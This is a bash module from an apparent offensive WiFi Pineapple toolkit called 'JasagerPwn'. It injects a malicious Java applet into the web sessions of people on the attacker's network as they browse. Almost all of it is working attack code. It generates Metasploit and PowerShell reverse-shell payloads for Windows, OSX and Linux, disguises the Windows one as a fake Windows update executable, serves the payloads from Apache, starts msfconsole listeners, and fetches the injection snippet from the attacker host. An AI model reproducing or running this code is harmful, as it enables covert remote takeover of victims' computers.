#
# Inject OS-Agnostic Java Applet into 
# victims web sessions while they surf.
# - Contains powershell injection meterpreter, a
#   custom windows payload, osx shell, and *nix shell
#
# Author: Leg3nd @ https://leg3nd.me
#

################ Module Configuration ##
# Module Title
title="Java Applet Injector"
# Create a description for menu
description="Java Applet Injection Phishing"
# Letter keys/commands to select item in menu
bindings='J|j'
#########################################

# Variables
java_www="/var/www/java-applet-injector"

# Start Function
function start_javaappletinjector(){
  echo -e "\e[01;34m[>]\e[00m Running Java Applet Transparent Injection Attack..."  
  
  # Create our powershell payload
  echo -e "\e[01;34m[>]\e[00m Generating x86 and x64 PowerShell code..."  
  if [ -x "src/powershell_payload.py" ]; then chmod +x src/powershell_payload.py ; fi
  python src/powershell_payload.py "${our_ip}" "${ps_win_port}"
  x86="$(cat /tmp/x86.powershell.alnum)" 
  x64="$(cat /tmp/x64.powershell.alnum)"
  
  # Our Applet Code to Inject
  applet_data="<applet width=\"1\" height=\"1\" id=\"Secure Java Applet\" code=\"Java.class\" archive=\"http://${our_ip}:80/Signed_Update.jar\"><param name=\"WINDOWS\" value=\"http://${our_ip}:80/Windows-KB183905-x86-ENU.exe\"><param name=\"STUFF\" value=\"\"><param name=\"OSX\" value=\"http://${our_ip}:80/osx.bin\"><param name=\"LINUX\" value=\"http://${our_ip}:80/nix.bin\"><param name=\"nextPage\" value=\"#\"><param name=\"64\" value=\"${x64}\"><param name=\"86\" value=\"${x86}\"><param name=\"separate_jvm\" value=\"true\"/></applet>"
  
  # Clean Up
  if [ -e "src/web_templates/java-www/osx.bin" ]; then rm -f "src/web_templates/java-www/osx.bin"; fi
  if [ -e "src/web_templates/java-www/nix.bin" ]; then rm -f "src/web_templates/java-www/nix.bin"; fi
  if [ -e "src/web_templates/java-www/Windows-KB183905-x86-ENU.exe" ]; then rm -f "src/web_templates/java-www/Windows-KB183905-x86-ENU.exe"; fi

  # Windows Payload
  echo -e "\e[01;34m[>]\e[00m Generating binary payloads..."  
  if [ ! "${windows_payload}" ]; then
    xterm -geometry 75x15+10+0 -bg black -fg green -T "[JasagerPwn] v${version} - Metasploit (Windows)" -e "msfpayload windows/meterpreter/reverse_tcp LHOST=${our_ip} LPORT=${win_port} R | msfencode -t exe -e x86/shikata_ga_nai -c 10 -o ${java_www}/Windows-KB183905-x86-ENU.exe"
  else
    if [ -e "${windows_payload}" ]; then
      cp -f "${windows_payload}" "${java_www}/Windows-KB183905-x86-ENU.exe"
    else
      echo -e "\e[01;34m[-]\e[00m Notice: Windows Payload was not found. Defaulting back to metasploit..."
      xterm -geometry 75x15+10+0 -bg black -fg green -T "[JasagerPwn] v${version} - Metasploit (Windows)" -e "msfpayload windows/meterpreter/reverse_tcp LHOST=${our_ip} LPORT=${win_port} R | msfencode -t exe -e x86/shikata_ga_nai -c 10 -o ${java_www}/Windows-KB183905-x86-ENU.exe"
    fi
  fi

  # Mac OSX Payload
  xterm -geometry 75x15+10+0 -bg black -fg green -T "[JasagerPwn] v${version} - Metasploit (OSX)" -e "msfpayload osx/x86/shell_reverse_tcp LPORT=${osx_port} LHOST=${our_ip} X > ${java_www}/osx.bin"
  # Linux Payload
  xterm -geometry 75x15+10+0 -bg black -fg green -T "[JasjavaappletagerPwn] v${version} - Metasploit (Linux)" -e "msfpayload linux/x86/shell/reverse_tcp LPORT=${nix_port} LHOST=${our_ip} X  > ${java_www}/nix.bin"

  # Just keep the victim off our server other than payload downloads
  echo -e "\e[01;34m[>]\e[00m Setting up Apache server...."  
  if [ ! -e "${java_www}" ]; then mkdir "${java_www}" ; fi

  echo -e '<html>\n<head><meta http-equiv="refresh" content="0; url=http://yahoo.com/"></head></html>' 1> ${java_www}/index.html 2> /dev/null
  cp src/Signed_Update.jar "${java_www}/" 2> /dev/null
  echo ${applet_data} 1> ${java_www}/injectme.txt 2> /dev/null
  
  chown -R www-data:www-data "${java_www}/" 2> /dev/null
  
  echo "<VirtualHost *:80>
	  ServerAdmin webmaster@localhost
	  DocumentRoot ${java_www}
	  <Directory />
		  Options FollowSymLinks
		  AllowOverride None
	  </Directory>
	  <Directory ${java_www}>
		  Options Indexes FollowSymLinks MultiViews
		  AllowOverride None
		  Order allow,deny
		  allow from all
	  </Directory>
	  ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
	  <directory \"/usr/lib/cgi-bin\">
		  AllowOverride None
		  Options ExecCGI -MultiViews +SymLinksIfOwnerMatch
		  Order allow,deny
		  Allow from all
	  </directory>
	  ErrorDocument 403 /index.html
	  ErrorDocument 404 /index.html
  </VirtualHost>
  " > /etc/apache2/sites-available/java-applet-injector
  
  # Start up our apache server to host the payloads
  xterm -geometry 75x8+100+0 -T "[JasagerPwn] v${version} - Starting Apache2" -e "ls /etc/apache2/sites-available/ | xargs a2dissite && a2ensite java-applet-injector && a2enmod php5 && /etc/init.d/apache2 reload"
  service apache2 restart > /dev/null 2>&1
  
  # Metasploit resource script
  echo -e "use exploit/multi/handler
  set PAYLOAD windows/meterpreter/reverse_tcp
  set LHOST 0.0.0.0
  set LPORT ${win_port}
  set ExitOnSession false
  set AutoRunScript \"\"
  set InitialAutorunScript multiscript -rc /tmp/autorun.rc
  exploit -j
  set PAYLOAD osx/x86/shell_reverse_tcp
  set LHOST 0.0.0.0
  set LPORT ${osx_port}
  set ExitOnSession false
  set InitialAutorunScript \"\"
  set AutoRunScript \"\"
  exploit -j
  set PAYLOAD linux/x86/shell/reverse_tcp
  set LHOST 0.0.0.0
  set LPORT ${nix_port}
  set ExitOnSession false
  set InitialAutorunScript \"\"
  set AutoRunScript \"\"
  exploit -j
  set PAYLOAD windows/meterpreter/reverse_tcp
  set LHOST 0.0.0.0
  set LPORT ${ps_win_port}
  set InitialAutorunScript \"\"
  set AutoRunScript migrate -f -k
  set ExitOnSession false
  exploit -j
  jobs -v" > /tmp/msfrc
  
  # Get our payload listener's ready
  echo -e "\e[01;34m[>]\e[00m Starting metasploit listeners..."  
  terminator -e "msfconsole -r /tmp/msfrc" > /dev/null 2>&1 &

  # Start up code injector for java applet injection
  echo -e "\e[01;34m[>]\e[00m Enabling code injection on pineapple.."    
  command="killall -9 ruby ; wget -O /pineapple/components/infusions/codeinject/includes/resource/injectme.txt http://${our_ip}/injectme.txt ; echo ${our_ip} > /pineapple/components/infusions/codeinject/includes/resource/attacker_ip.txt ; cd /pineapple/components/infusions/codeinject/includes/ ; bash start.sh"
  pineapple_command
}

# Stop Function
function stop_javaappletinjector(){
  command="cd /pineapple/components/infusions/codeinject/includes/ ; bash stop.sh"
  pineapple_command
}
